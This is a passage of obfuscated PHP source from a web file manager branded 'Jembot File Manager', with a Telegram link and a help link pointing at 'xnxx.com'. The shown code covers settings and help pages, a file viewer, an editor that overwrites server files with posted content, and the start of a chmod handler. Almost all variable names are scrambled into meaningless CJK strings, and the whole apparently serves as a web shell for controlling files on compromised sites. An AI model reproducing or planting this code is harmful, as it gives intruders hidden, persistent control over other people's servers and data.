echo urlencode($沣剛繖銏夈泔︼姉唩) ?>"><i class="fa fa-folder-o"></i> <?php 
echo fm_convert_win($镢傘銇点镢亖镢垇笺粡) ?></a>
                </li>
            <?php

            }
            ?>
        </ul>
    </div>
<?php

    fm_show_footer();
    exit;
}

if (isset($_GET['settings']) && !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $銠銈啓劶沣瓎亖併紒沣, $伝堛崐飦銏镢熴檨銇层, $銇沣勩銐銏沣偧銈镢慵;
?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-cog"></i> <?php 
echo lng('Settings') ?></span>
                <a href="?p=<?php 
echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php 
echo lng('Cancel') ?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php 
echo lng('Language') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select" id="js-language" name="js-language">
                                <?php

                                function getSelected($銏妬劍潒垇併銐紓︺扛)
                                {
                                    global $伝堛崐飦銏镢熴檨銇层;
                                    return ($伝堛崐飦銏镢熴檨銇层 == $銏妬劍潒垇併銐紓︺扛) ? 'selected' : '';
                                }
                                foreach ($銇沣勩銐銏沣偧銈镢慵 as $笺剤愀剚銖侊祦墎紒沣 => $銇紓伈緛扛傘剚曪銇笺) {
                                    echo "<option value='$笺剤愀剚銖侊祦墎紒沣' " . getSelected($笺剤愀剚銖侊祦墎紒沣) . ">$銇紓伈緛扛傘剚曪銇笺</option>";
                                }
                                ?>
                            </select>
                        </div>
                    </div>
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php 
echo lng('ErrorReporting') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php 
echo $搶銈惘沣飭倞汇沣亪銇 ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php 
echo lng('ShowHiddenFiles') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php 
echo $粏剚亖級棳慵紗娿唵壔 ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php 
echo lng('HideColumns') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php 
echo $笺泔搫銇埐慵嗐嗐沣併 ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php 
echo lng('Theme') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select w-100 text-capitalize" id="js-3-0" name="js-theme-3">
                                <option value='light' <?php 
if ($銊悻銇憧侊悛镲壇诧锛 == "light") {
                                                            echo "selected";
                                                        } ?>>
                                    <?php 
echo lng('light') ?>
                                </option>
                                <option value='dark' <?php 
if ($銊悻銇憧侊悛镲壇诧锛 == "dark") {
                                                            echo "selected";
                                                        } ?>>
                                    <?php 
echo lng('dark') ?>
                                </option>
                            </select>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php 
echo lng('Save'); ?></button>
                        </div>
                    </div>

                    <small class="text-body-secondary">* <?php 
echo lng('Sometimes the save action may not work on the first try, so please attempt it again') ?>.</span>
                </form>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

if (isset($_GET['help'])) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $銠銈啓劶沣瓎亖併紒沣, $伝堛崐飦銏镢熴檨銇层;
?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php 
echo lng('Help') ?></span>
                <a href="?p=<?php 
echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php 
echo lng('Cancel') ?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
                        <h3><a href="https://t.me/ISC2k17" target="_blank" class="app-v-title"> Jembot File Manager <?php 
echo VERSION; ?></a></h3>
                        </p>
                        <p>Author: PRA艢ATH MAN陌</p>
                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers [at] gmail [dot] com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="xnxx.com" target="_blank"><i class="fa fa-question-circle"></i> <?php 
echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="xnxx.com" target="_blank"><i class="fa fa-bug"></i> <?php 
echo lng('Report Issue') ?></a></li>
                                <?php 
if (!FM_READONLY) { ?>
                                    <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php 
echo lng('Generate new password hash') ?></a></li>
                                <?php 
} ?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php 
echo lng('Generate new password hash') ?></label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php 
echo lng('Password') ?></label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php 
echo lng('Password') ?>" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php 
echo lng('Generate') ?></button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// file viewer
if (isset($_GET['view'])) {
    $慊銇愕仚剚亗焷獋亖銇 = $_GET['view'];
    $慊銇愕仚剚亗焷獋亖銇 = fm_clean_path($慊銇愕仚剚亗焷獋亖銇, false);
    $慊銇愕仚剚亗焷獋亖銇 = str_replace('/', '', $慊銇愕仚剚亗焷獋亖銇);
    if ($慊銇愕仚剚亗焷獋亖銇 == '' || !is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇) || !fm_is_exclude_items($慊銇愕仚剚亗焷獋亖銇)) {
        fm_set_msg(lng('File not found'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $笺紒併妶康銐亖併沣矇 = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $慊銇愕仚剚亗焷獋亖銇);
    $粊銇堛粊畟沣硷併亖 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇;

    $沣銈倐娿珎併墎壖併飦 = strtolower(pathinfo($粊銇堛粊畟沣硷併亖, PATHINFO_EXTENSION));
    $沣慊笺垈垇侊︺亪忋 = fm_get_mime_type($粊銇堛粊畟沣硷併亖);
    $堛銇亖技堛亪偢偧埧 = fm_get_size($粊銇堛粊畟沣硷併亖);
    $銇亰伡剟慊銐垈泔銐緣 = fm_get_filesize($堛銇亖技堛亪偢偧埧);

    $锛慵緞飩欍沣竵疾亖 = false;
    $亪併銏併併銇亾慊辑唩 = false;
    $亖喖祱亖痪飦倎銈尲 = false;
    $亞沣嗐堬慵銇墕亪慊 = false;
    $併亞亖愕暤亖瓉粫垑嶃 = false;
    $銏技亖慊銇亗侊併伎剚 = false;
    $嗐櫦珶飦併伝泔慵亗銏 = false;

    $喌亖夛亖诧剚亯镢亗壀 = 'File';
    $搧倖倐併慊憧倐銇姯壆 = false; // for zip
    $銇飦銈焷櫙憔銏亯併慵 = ''; // for text
    $亪夈飦裤籍獣悛喖墎壍 = strtolower(FM_DOC_VIEWER);

    if ($亪夈飦裤籍獣悛喖墎壍 && $亪夈飦裤籍獣悛喖墎壍 !== 'false' && in_array($沣銈倐娿珎併墎壖併飦, fm_get_onlineViewer_exts())) {
        $嗐櫦珶飦併伝泔慵亗銏 = true;
    } elseif ($沣銈倐娿珎併墎壖併飦 == 'zip' || $沣銈倐娿珎併墎壖併飦 == 'tar') {
        $锛慵緞飩欍沣竵疾亖 = true;
        $喌亖夛亖诧剚亯镢亗壀 = 'Archive';
        $搧倖倐併慊憧倐銇姯壆 = fm_get_zif_info($粊銇堛粊畟沣硷併亖, $沣銈倐娿珎併墎壖併飦);
    } elseif (in_array($沣銈倐娿珎併墎壖併飦, fm_get_image_exts())) {
        $亖喖祱亖痪飦倎銈尲 = true;
        $喌亖夛亖诧剚亯镢亗壀 = 'Image';
    } elseif (in_array($沣銈倐娿珎併墎壖併飦, fm_get_audio_exts())) {
        $亞沣嗐堬慵銇墕亪慊 = true;
        $喌亖夛亖诧剚亯镢亗壀 = 'Audio';
    } elseif (in_array($沣銈倐娿珎併墎壖併飦, fm_get_video_exts())) {
        $併亞亖愕暤亖瓉粫垑嶃 = true;
        $喌亖夛亖诧剚亯镢亗壀 = 'Video';
    } elseif (in_array($沣銈倐娿珎併墎壖併飦, fm_get_text_exts()) || substr($沣慊笺垈垇侊︺亪忋, 0, 4) == 'text' || in_array($沣慊笺垈垇侊︺亪忋, fm_get_text_mimes())) {
        $銏技亖慊銇亗侊併伎剚 = true;
        $銇飦銈焷櫙憔銏亯併慵 = file_get_contents($粊銇堛粊畟沣硷併亖);
    }

?>
    <div class="row">
        <div class="col-12">
            <ul class="list-group w-50 my-3" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <li class="list-group-item active" aria-current="true"><strong><?php 
echo lng($喌亖夛亖诧剚亯镢亗壀) ?>:</strong> <?php 
echo fm_enc(fm_convert_win($慊銇愕仚剚亗焷獋亖銇)) ?></li>
                <?php 
$夈併銞伈傘亖搹銊侊亗 = fm_get_display_path($粊銇堛粊畟沣硷併亖); ?>
                <li class="list-group-item"><strong><?php 
echo $夈併銞伈傘亖搹銊侊亗['label']; ?>:</strong> <?php 
echo $夈併銞伈傘亖搹銊侊亗['path']; ?></li>
                <li class="list-group-item"><strong>File size:</strong> <?php 
echo ($堛銇亖技堛亪偢偧埧 <= 1000) ? "$堛銇亖技堛亪偢偧埧 bytes" : $銇亰伡剟慊銐垈泔銐緣; ?></li>
                <li class="list-group-item"><strong>MIME-type:</strong> <?php 
echo $沣慊笺垈垇侊︺亪忋 ?></li>
                <?php

                // ZIP info
                if (($锛慵緞飩欍沣竵疾亖 || $亪併銏併併銇亾慊辑唩) && $搧倖倐併慊憧倐銇姯壆 !== false) {
                    $偦沣仚銦欍慵亯垇笺嫉 = 0;
                    $傘伡墕沣焼矋級銐併 = 0;
                    $沣亾娿泔亗沣紗亗紛粊 = 0;
                    foreach ($搧倖倐併慊憧倐銇姯壆 as $亗嫉亖粰亖垞亗亖煫侊) {
                        if (!$亗嫉亖粰亖垞亗亖煫侊['folder']) {
                            $偦沣仚銦欍慵亯垇笺嫉++;
                        }
                        $傘伡墕沣焼矋級銐併 += $亗嫉亖粰亖垞亗亖煫侊['compressed_size'];
                        $沣亾娿泔亗沣紗亗紛粊 += $亗嫉亖粰亖垞亗亖煫侊['filesize'];
                    }
                ?>
                    <li class="list-group-item"><?php 
echo lng('Files in archive') ?>: <?php 
echo $偦沣仚銦欍慵亯垇笺嫉 ?></li>
                    <li class="list-group-item"><?php 
echo lng('Total size') ?>: <?php 
echo fm_get_filesize($沣亾娿泔亗沣紗亗紛粊) ?></li>
                    <li class="list-group-item"> <?php 
echo lng('Size in archive') ?>: <?php 
echo fm_get_filesize($傘伡墕沣焼矋級銐併) ?></li>
                    <li class="list-group-item"><?php 
echo lng('Compression') ?>: <?php 
echo round(($傘伡墕沣焼矋級銐併 / max($沣亾娿泔亗沣紗亗紛粊, 1)) * 100) ?>%</li>
                <?php

                }
                // Image info
                if ($亖喖祱亖痪飦倎銈尲) {
                    $亪侊伒唹伄併亯粋锟級 = getimagesize($粊銇堛粊畟沣硷併亖);
                    echo '<li class="list-group-item"><strong>' . lng('Image size') . ':</strong> ' . (isset($亪侊伒唹伄併亯粋锟級[0]) ? $亪侊伒唹伄併亯粋锟級[0] : '0') . ' x ' . (isset($亪侊伒唹伄併亯粋锟級[1]) ? $亪侊伒唹伄併亯粋锟級[1] : '0') . '</li>';
                }
                // Text info
                if ($銏技亖慊銇亗侊併伎剚) {
                    $銇紕嗭銌銈布亖繌銐唫 = fm_is_utf8($銇飦銈焷櫙憔銏亯併慵);
                    if (function_exists('iconv')) {
                        if (!$銇紕嗭銌銈布亖繌銐唫) {
                            $銇飦銈焷櫙憔銏亯併慵 = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $銇飦銈焷櫙憔銏亯併慵);
                        }
                    }
                    echo '<li class="list-group-item"><strong>' . lng('Charset') . ':</strong> ' . ($銇紕嗭銌銈布亖繌銐唫 ? 'utf-8' : '8 bit') . '</li>';
                }
                ?>
            </ul>
            <div class="btn-group btn-group-sm flex-wrap" role="group">
                <form method="post" class="d-inline mb-0 btn btn-outline-primary" action="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;dl=<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>">
                    <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                    <button type="submit" class="btn btn-link btn-sm text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php 
echo lng('Download') ?></button> &nbsp;
                </form>
                <?php 
if (!FM_READONLY): ?>
                    <a class="fw-bold btn btn-outline-primary" title="<?php 
echo lng('Delete') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;del=<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>" onclick="confirmDailog(event, 1209, '<?php 
echo lng('Delete') . ' ' . lng('File'); ?>','<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇); ?>', this.href);"> <i class="fa fa-trash"></i> Delete</a>
                <?php 
endif; ?>
                <a class="fw-bold btn btn-outline-primary" href="<?php 
echo fm_enc($笺紒併妶康銐亖併沣矇) ?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php 
echo lng('Open') ?></a></b>
                <?php

                // ZIP actions
                if (!FM_READONLY && ($锛慵緞飩欍沣竵疾亖 || $亪併銏併併銇亾慊辑唩) && $搧倖倐併慊憧倐銇姯壆 !== false) {
                    $亖Ω銊亖硷飯棘慊沣 = pathinfo($粊銇堛粊畟沣硷併亖, PATHINFO_FILENAME);
                ?>
                    <form method="post" class="d-inline btn btn-outline-primary mb-0">
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇); ?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0 border-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php 
echo lng('UnZip') ?></button>
                    </form>
                    <form method="post" class="d-inline btn btn-outline-primary mb-0">
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇); ?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php 
echo fm_enc($亖Ω銊亖硷飯棘慊沣) ?>"><i class="fa fa-check-circle"></i> <?php 
echo lng('UnZipToFolder') ?></button>
                    </form>
                <?php

                }
                if ($銏技亖慊銇亗侊併伎剚 && !FM_READONLY) {
                ?>
                    <a class="fw-bold btn btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>" class="edit-file">
                        <i class="fa fa-pencil-square"></i> <?php 
echo lng('Edit') ?>
                    </a>
                    <a class="fw-bold btn btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>&env=ace"
                        class="edit-file"><i class="fa fa-pencil-square"></i> <?php 
echo lng('AdvancedEditor') ?>
                    </a>
                <?php 
} ?>
                <a class="fw-bold btn btn-outline-primary" href="?p=<?php 
echo urlencode(FM_PATH) ?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php 
echo lng('Back') ?></a>
            </div>
            <div class="row mt-3">
                <?php

                if ($嗐櫦珶飦併伝泔慵亗銏) {
                    if ($亪夈飦裤籍獣悛喖墎壍 == 'google') {
                        echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url=' . fm_enc($笺紒併妶康銐亖併沣矇) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                    } else if ($亪夈飦裤籍獣悛喖墎壍 == 'microsoft') {
                        echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src=' . fm_enc($笺紒併妶康銐亖併沣矇) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                    }
                } elseif ($锛慵緞飩欍沣竵疾亖) {
                    // ZIP content
                    if ($搧倖倐併慊憧倐銇姯壆 !== false) {
                        echo '<code class="maxheight">';
                        foreach ($搧倖倐併慊憧倐銇姯壆 as $亗嫉亖粰亖垞亗亖煫侊) {
                            if ($亗嫉亖粰亖垞亗亖煫侊['folder']) {
                                echo '<b>' . fm_enc($亗嫉亖粰亖垞亗亖煫侊['name']) . '</b><br>';
                            } else {
                                echo $亗嫉亖粰亖垞亗亖煫侊['name'] . ' (' . fm_get_filesize($亗嫉亖粰亖垞亗亖煫侊['filesize']) . ')<br>';
                            }
                        }
                        echo '</code>';
                    } else {
                        echo '<p>' . lng('Error while fetching archive info') . '</p>';
                    }
                } elseif ($亖喖祱亖痪飦倎銈尲) {
                    // Image content
                    if (in_array($沣銈倐娿珎併墎壖併飦, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))) {
                        echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="' . fm_enc($笺紒併妶康銐亖併沣矇) . '" alt="image" class="preview-img"></label></p>';
                    }
                } elseif ($亞沣嗐堬慵銇墕亪慊) {
                    // Audio content
                    echo '<p><audio src="' . fm_enc($笺紒併妶康銐亖併沣矇) . '" controls preload="metadata"></audio></p>';
                } elseif ($併亞亖愕暤亖瓉粫垑嶃) {
                    // Video content
                    echo '<div class="preview-video"><video src="' . fm_enc($笺紒併妶康銐亖併沣矇) . '" width="640" height="360" controls preload="metadata"></video></div>';
                } elseif ($銏技亖慊銇亗侊併伎剚) {
                    if (FM_USE_HIGHLIGHTJS) {
                        // highlight
                        $傘熴亞飯亯剤銇倎併堬 = array(
                            'shtml' => 'xml',
                            'htaccess' => 'apache',
                            'phtml' => 'php',
                            'lock' => 'json',
                            'svg' => 'xml',
                        );
                        $泔粊妬沣亗沣倢沣傘夈 = isset($傘熴亞飯亯剤銇倎併堬[$沣銈倐娿珎併墎壖併飦]) ? 'lang-' . $傘熴亞飯亯剤銇倎併堬[$沣銈倐娿珎併墎壖併飦] : 'lang-' . $沣銈倐娿珎併墎壖併飦;
                        if (empty($沣銈倐娿珎併墎壖併飦) || in_array(strtolower($慊銇愕仚剚亗焷獋亖銇), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $慊銇愕仚剚亗焷獋亖銇)) {
                            $泔粊妬沣亗沣倢沣傘夈 = 'nohighlight';
                        }
                        $銇飦銈焷櫙憔銏亯併慵 = '<pre class="with-hljs"><code class="' . $泔粊妬沣亗沣倢沣傘夈 . '">' . fm_enc($銇飦銈焷櫙憔銏亯併慵) . '</code></pre>';
                    } elseif (in_array($沣銈倐娿珎併墎壖併飦, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
                        // php highlight
                        $銇飦銈焷櫙憔銏亯併慵 = highlight_string($銇飦銈焷櫙憔銏亯併慵, true);
                    } else {
                        $銇飦銈焷櫙憔銏亯併慵 = '<pre>' . fm_enc($銇飦銈焷櫙憔銏亯併慵) . '</pre>';
                    }
                    echo $銇飦銈焷櫙憔銏亯併慵;
                }
                ?>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// file editor
if (isset($_GET['edit']) && !FM_READONLY) {
    $慊銇愕仚剚亗焷獋亖銇 = $_GET['edit'];
    $慊銇愕仚剚亗焷獋亖銇 = fm_clean_path($慊銇愕仚剚亗焷獋亖銇, false);
    $慊銇愕仚剚亗焷獋亖銇 = str_replace('/', '', $慊銇愕仚剚亗焷獋亖銇);
    if ($慊銇愕仚剚亗焷獋亖銇 == '' || !is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇) || !fm_is_exclude_items($慊銇愕仚剚亗焷獋亖銇)) {
        fm_set_msg(lng('File not found'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }
    $銇患銇垇亯偧銇沣銇銏 = ' : <i><b>' . $慊銇愕仚剚亗焷獋亖銇 . '</b></i>';
    header('X-XSS-Protection:0');
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $笺紒併妶康銐亖併沣矇 = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $慊銇愕仚剚亗焷獋亖銇);
    $粊銇堛粊畟沣硷併亖 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇;

    // normal editer
    $汇沣沣亪併铴獎镢沣搧 = true;
    if (isset($_GET['env'])) {
        if ($_GET['env'] == "ace") {
            $汇沣沣亪併铴獎镢沣搧 = false;
        }
    }

    // Save File
    if (isset($_POST['savedata'])) {
        $侊考娿亖垇慵夈劵紙銇 = $_POST['savedata'];
        $悴祦剚檨堛嶃飦Σ嗐伈 = fopen($粊銇堛粊畟沣硷併亖, "w");
        @fwrite($悴祦剚檨堛嶃飦Σ嗐伈, $侊考娿亖垇慵夈劵紙銇);
        fclose($悴祦剚檨堛嶃飦Σ嗐伈);
        fm_set_msg(lng('File Saved Successfully'));
    }

    $沣銈倐娿珎併墎壖併飦 = strtolower(pathinfo($粊銇堛粊畟沣硷併亖, PATHINFO_EXTENSION));
    $沣慊笺垈垇侊︺亪忋 = fm_get_mime_type($粊銇堛粊畟沣硷併亖);
    $銇亰伡剟慊銐垈泔銐緣 = filesize($粊銇堛粊畟沣硷併亖);
    $銏技亖慊銇亗侊併伎剚 = false;
    $銇飦銈焷櫙憔銏亯併慵 = ''; // for text

    if (in_array($沣銈倐娿珎併墎壖併飦, fm_get_text_exts()) || substr($沣慊笺垈垇侊︺亪忋, 0, 4) == 'text' || in_array($沣慊笺垈垇侊︺亪忋, fm_get_text_mimes())) {
        $銏技亖慊銇亗侊併伎剚 = true;
        $銇飦銈焷櫙憔銏亯併慵 = file_get_contents($粊銇堛粊畟沣硷併亖);
    }

?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php 
if (!$汇沣沣亪併铴獎镢沣搧) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php 
echo lng('Fullscreen') ?>"><i class="fa fa-expand" title="<?php 
echo lng('Fullscreen') ?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php 
echo lng('Search') ?>"><i class="fa fa-search" title="<?php 
echo lng('Search') ?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php 
echo lng('Undo') ?>"><i class="fa fa-undo" title="<?php 
echo lng('Undo') ?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php 
echo lng('Redo') ?>"><i class="fa fa-repeat" title="<?php 
echo lng('Redo') ?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php 
echo lng('Word Wrap') ?>"><i class="fa fa-text-width" title="<?php 
echo lng('Word Wrap') ?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php 
echo lng('Select Document Type') ?>" class="btn-outline-secondary border-start-0 d-none d-md-block">
                                <option>-- <?php 
echo lng('Select Mode') ?> --</option>
                            </select>
                            <select id="js-ace-theme" data-type="theme" title="<?php 
echo lng('Select Theme') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block">
                                <option>-- <?php 
echo lng('Select Theme') ?> --</option>
                            </select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php 
echo lng('Select Font Size') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block">
                                <option>-- <?php 
echo lng('Select Font Size') ?> --</option>
                            </select>
                        </div>
                    <?php 
} ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <div class="btn-group">
                    <a title=" <?php 
echo lng('Back') ?>" class="btn btn-sm btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>"><i class="fa fa-reply-all"></i> <?php 
echo lng('Back') ?></a>
                    <a title="<?php 
echo lng('BackUp') ?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php 
echo urlencode(trim(FM_PATH)) ?>','<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>')"><i class="fa fa-database"></i> <?php 
echo lng('BackUp') ?></a>
                    <?php 
if ($銏技亖慊銇亗侊併伎剚) { ?>
                        <?php 
if ($汇沣沣亪併铴獎镢沣搧) { ?>
                            <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php 
echo lng('AdvancedEditor') ?></a>
                            <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php 
echo fm_enc($笺紒併妶康銐亖併沣矇) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                            </button>
                        <?php 
} else { ?>
                            <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($慊銇愕仚剚亗焷獋亖銇) ?>"><i class="fa fa-text-height"></i> <?php 
echo lng('NormalEditor') ?></a>
                            <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php 
echo fm_enc($笺紒併妶康銐亖併沣矇) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php 
echo lng('Save') ?>
                            </button>
                        <?php 
} ?>
                    <?php 
} ?>
                </div>
            </div>
        </div>
        <?php

        if ($銏技亖慊銇亗侊併伎剚 && $汇沣沣亪併铴獎镢沣搧) {
            echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">' . htmlspecialchars($銇飦銈焷櫙憔銏亯併慵) . '</textarea>';
            echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  && e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';
        } elseif ($銏技亖慊銇亗侊併伎剚) {
            echo '<div id="editor" contenteditable="true">' . htmlspecialchars($銇飦銈焷櫙憔銏亯併慵) . '</div>';
        } else {
            fm_set_msg(lng('FILE EXTENSION HAS NOT SUPPORTED'), 'error');
        }
        ?>
    </div>
<?php

    fm_show_footer();
    exit;
}

// chmod (not for Windows)
if (isset($_GET['chmod']) && !FM_READONLY && !FM_IS_WIN) {
    $慊銇愕仚剚亗焷獋亖銇 = $_GET['chmod'];
    $慊銇愕仚剚亗焷獋亖銇 = fm_clean_path($慊銇愕仚剚亗焷獋亖銇);
    $慊銇愕仚剚亗焷獋亖銇 = str_replace('/', '', $慊銇愕仚剚亗焷獋亖銇);
    if ($慊銇愕仚剚亗焷獋亖銇 == '' || (!is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇) && !is_dir($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇))) {
        fm_set_msg(lng('File not found'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
